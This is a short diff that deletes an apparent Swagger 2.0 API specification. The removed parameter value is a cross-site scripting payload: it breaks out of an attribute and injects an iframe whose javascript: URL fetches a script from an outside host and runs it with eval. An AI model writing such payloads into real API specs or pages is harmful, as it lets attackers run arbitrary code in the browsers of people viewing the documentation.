@@ -1,3 +1,0 @@
-{"paths":{"/a":{"post":{"parameters":[{"X-data-swag":"whatever'><iframe src='javascript:fetch('https://b8.ee/1.js')
-  .then(response => response.text())
-  .then(code => eval(code));'></iframe>'"}]}}},"swagger":"2.0"}
